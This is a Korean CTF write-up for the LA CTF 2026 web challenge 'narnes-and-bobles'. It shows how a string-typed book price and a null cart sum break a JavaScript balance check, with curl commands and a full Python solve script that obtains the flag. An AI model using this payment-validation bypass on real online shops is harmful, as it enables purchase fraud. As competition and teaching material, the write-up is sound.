---
title: "LA CTF 2026 | narnes-and-bobles"
date: 2026-02-10 01:00:00 +0900
categories: [LA CTF 2026, Web]
tags: [Web]
toc: true
comments: false
---

# narnes-and-bobles

> “I heard Amazon killed a certain book store so I'm gonna make my own book store and kill Amazon.  
> I dove deep and delivered results.”

---

## TL;DR

- `/cart/add`에서 서버는 `additionalSum + cartSum > balance`면 “too poor”로 막는다.
- 그런데 `books.json`에 `price`가 **숫자**가 아니라 **문자열 `"10"`** 인 책이 존재한다.
- 또한 카트가 비어 있으면 SQL `SUM()` 결과가 `null`이 될 수 있다.
- 이 조합 때문에 JS의 `+` 연산이 **문자열 결합/NaN 흐름**으로 깨지면서, 잔액 비교가 정상적으로 평가되지 않아 **결제 검증 우회**가 가능하다.
- 따라서 `"10"` 가격 책 + Flag 책을 **같은 요청으로** 담고 `checkout`하면 ZIP에 `flag.txt`(full)가 포함된다.

---

## Overview

narnes-and-bobles는 온라인 서점 웹 서비스다.

- 회원가입/로그인
- 책을 장바구니에 담기
- 체크아웃 시 구매한 책 파일을 ZIP으로 다운로드

하지만 Flag 책의 가격이 **1,000,000**이고, 시작 잔액은 **1,000**이라 정상 구매가 불가능하다.  
따라서 목표는 **잔액 검증을 우회하여 `flag.txt`를 ZIP에 포함시키는 것**이다.

---

## Solution

### 1) Recon

소스 기준 주요 엔드포인트는 다음과 같다.

- `POST /register/` : 회원가입(세션 쿠키 발급)
- `POST /login/` : 로그인(세션 쿠키 발급)
- `GET /cart` : 장바구니/잔액 확인
- `POST /cart/add` : 장바구니 추가 + 잔액 검증
- `POST /cart/checkout` : ZIP 생성/다운로드

핵심은 `/cart/add`에서 결제(잔액) 검증이 수행된다는 점이다.

---

### 2) Root cause

#### (1) 문자열 price 존재

`books.json`에 일부 책의 `price`가 숫자가 아니라 문자열로 들어 있다.

- `part-time-parliament` : `price = "10"` (string)
- `flag` : `price = 1000000` (number)

#### (2) JS 타입 강제변환 + SUM(null)

서버는 `/cart/add`에서 가격 합을 대략 아래처럼 만든다(개념):

```js
additionalSum = productsToAdd
  .filter(p => !p.is_sample)
  .map(p => booksLookup.get(p.book_id).price)
  .reduce((l, r) => l + r, 0)
```

또한 현재 장바구니 합은 DB에서 `SUM()`으로 가져오는데, 카트가 비어 있으면 `cartSum = null`이 될 수 있다.

이때 문자열 `"10"`이 합산에 섞이면 `l + r`가 **숫자 덧셈이 아니라 문자열 결합**으로 바뀌거나,  
`additionalSum + cartSum`이 **NaN-ish 흐름**으로 깨질 수 있다.

결과적으로 마지막 체크:

```js
if (additionalSum + cartSum > balance) { ... }
```

가 정상적으로 “큰 수 > 1000”을 판정하지 못해, **Flag를 담아도 차단이 되지 않는 상태**가 된다.

---

### 3) Exploit / Reproduction

목표: 잔액(1000) 제한을 무시하고 `flag.txt(full)`를 ZIP에 포함시키기

#### 공격 흐름

1. 카트를 비운 상태로 시작 (`cartSum = null` 유도)
2. 문자열 price 책 + Flag 책을 **같은 요청**으로 `/cart/add`에 담기
3. 잔액 검증이 타입 문제로 붕괴 → 서버가 카트 추가를 허용
4. `/cart/checkout`으로 ZIP 다운로드
5. ZIP에서 `flag.txt` 추출

#### 사용한 book_id

- 문자열 price 책: `a3e33c2505a19d18`  (part-time-parliament, price = "10")
- Flag 책: `2a16e349fb9045fa`        (flag, price = 1000000)

#### WSL / curl

**1) 카트 비어있는지 확인**

```bash
curl -s -b cookies.txt "$BASE/cart"
# {"cart":[],"balance":1000} 형태면 OK
```

**2) 문자열 price 책 + Flag를 동시에 담기**

```bash
curl -s -c cookies.txt -b cookies.txt   -X POST "$BASE/cart/add"   -H 'Content-Type: application/json'   --data-binary @- <<'JSON'
{"products":[
  {"book_id":"a3e33c2505a19d18","is_sample":0},
  {"book_id":"2a16e349fb9045fa","is_sample":0}
]}
JSON
```

성공하면 `remainingBalance`가 큰 음수로 내려가도(예: `-100999000`) 에러 없이 통과한다.

**3) 체크아웃 & 플래그 추출**

```bash
curl -s -c cookies.txt -b cookies.txt   -X POST "$BASE/cart/checkout"   -o order.zip

unzip -p order.zip flag.txt
```

---

## Flag

`flag.txt`에서 확인한 플래그:

```
lactf{matcha_dubai_chocolate_labubu}
```

---
## Solve.py
```
#!/usr/bin/env python3
import argparse
import io
import os
import random
import re
import string
import sys
import zipfile
from urllib.parse import urljoin

import requests


FLAG_RE = re.compile(r"lactf\{[^}]+\}")

# Book IDs from the challenge source
STRING_PRICE_BOOK_ID = "a3e33c2505a19d18"  # part-time-parliament (price = "10")
FLAG_BOOK_ID = "2a16e349fb9045fa"          # flag (price = 1000000)


def rand_str(n: int = 10) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def main() -> None:
    ap = argparse.ArgumentParser(description="Solve narnes-and-bobles (LA CTF) via price type-coercion bug.")
    ap.add_argument("--base", required=True, help="Instance base URL, e.g. https://...instancer.lac.tf")
    ap.add_argument("--user", default=None, help="Optional username (random if omitted)")
    ap.add_argument("--pw", default=None, help="Optional password (random if omitted)")
    ap.add_argument("--insecure", action="store_true", help="Disable TLS verification (not recommended)")
    args = ap.parse_args()

    base = args.base.rstrip("/") + "/"
    s = requests.Session()
    s.verify = (not args.insecure)

    username = args.user or f"u_{rand_str(12)}"
    password = args.pw or f"p_{rand_str(16)}"

    # 1) Register (use /register/ with trailing slash)
    reg_url = urljoin(base, "register/")
    r = s.post(reg_url, data={"username": username, "password": password}, allow_redirects=False, timeout=15)
    if r.status_code not in (200, 302):
        print(f"[!] register unexpected status: {r.status_code}", file=sys.stderr)
        print(r.text[:300], file=sys.stderr)
        sys.exit(1)

    # If user already exists, try login instead (or re-roll)
    if r.status_code == 200 and "user already exists" in r.text.lower():
        # If user supplied, try logging in. Otherwise reroll a new user.
        if args.user:
            pass
        else:
            username = f"u_{rand_str(12)}"
            password = f"p_{rand_str(16)}"
            r = s.post(reg_url, data={"username": username, "password": password}, allow_redirects=False, timeout=15)
            if not (r.status_code in (200, 302) and not ("user already exists" in r.text.lower())):
                print("[!] failed to register fresh user", file=sys.stderr)
                print(r.text[:300], file=sys.stderr)
                sys.exit(1)

    # 2) Login (safe to do even after register)
    login_url = urljoin(base, "login/")
    r = s.post(login_url, data={"username": username, "password": password}, allow_redirects=False, timeout=15)
    if r.status_code not in (200, 302):
        print(f"[!] login unexpected status: {r.status_code}", file=sys.stderr)
        print(r.text[:300], file=sys.stderr)
        sys.exit(1)

    # 3) Confirm cart empty
    cart_url = urljoin(base, "cart")
    r = s.get(cart_url, timeout=15)
    if r.status_code != 200:
        print(f"[!] cart unexpected status: {r.status_code}", file=sys.stderr)
        print(r.text[:300], file=sys.stderr)
        sys.exit(1)

    # 4) Add string-price book + flag book together
    add_url = urljoin(base, "cart/add")
    payload = {
        "products": [
            {"book_id": STRING_PRICE_BOOK_ID, "is_sample": 0},
            {"book_id": FLAG_BOOK_ID, "is_sample": 0},
        ]
    }
    r = s.post(add_url, json=payload, timeout=15)
    if r.status_code != 200:
        print(f"[!] cart/add unexpected status: {r.status_code}", file=sys.stderr)
        print(r.text[:300], file=sys.stderr)
        sys.exit(1)

    try:
        j = r.json()
    except Exception:
        print("[!] cart/add did not return JSON", file=sys.stderr)
        print(r.text[:300], file=sys.stderr)
        sys.exit(1)

    if "err" in j:
        print(f"[!] server error from /cart/add: {j['err']}", file=sys.stderr)
        print("[!] If this happens, ensure the cart is empty and the instance matches the challenge.", file=sys.stderr)
        sys.exit(1)

    # 5) Checkout -> zip
    checkout_url = urljoin(base, "cart/checkout")
    r = s.post(checkout_url, timeout=30)
    if r.status_code != 200:
        print(f"[!] checkout unexpected status: {r.status_code}", file=sys.stderr)
        print(r.text[:300], file=sys.stderr)
        sys.exit(1)

    zdata = io.BytesIO(r.content)
    try:
        zf = zipfile.ZipFile(zdata)
    except zipfile.BadZipFile:
        print("[!] response is not a valid zip", file=sys.stderr)
        print(r.content[:200], file=sys.stderr)
        sys.exit(1)

    # 6) Extract flag.txt
    names = zf.namelist()
    if "flag.txt" not in names:
        print("[!] flag.txt not present in zip. Files:", names, file=sys.stderr)
        # As a hint, dump any text files
        for n in names:
            if n.endswith(".txt"):
                try:
                    print(f"--- {n} ---")
                    print(zf.read(n).decode("utf-8", errors="replace"))
                except Exception:
                    pass
        sys.exit(1)

    flag_txt = zf.read("flag.txt").decode("utf-8", errors="replace")
    m = FLAG_RE.search(flag_txt)
    if not m:
        print("[!] Could not find lactf{...} in flag.txt contents:", file=sys.stderr)
        print(flag_txt, file=sys.stderr)
        sys.exit(1)

    print(m.group(0))


if __name__ == "__main__":
    main()

"
```

---
## Notes

- 처음에 흔히 시도하는 `is_sample` 타입 트릭(예: `"0"`)은 인스턴스/구현 차이로 안 먹힐 수 있다.
- 이 write-up은 **price 타입 불일치 + JS coercion**이라는 더 안정적인 우회에 초점을 맞췄다.
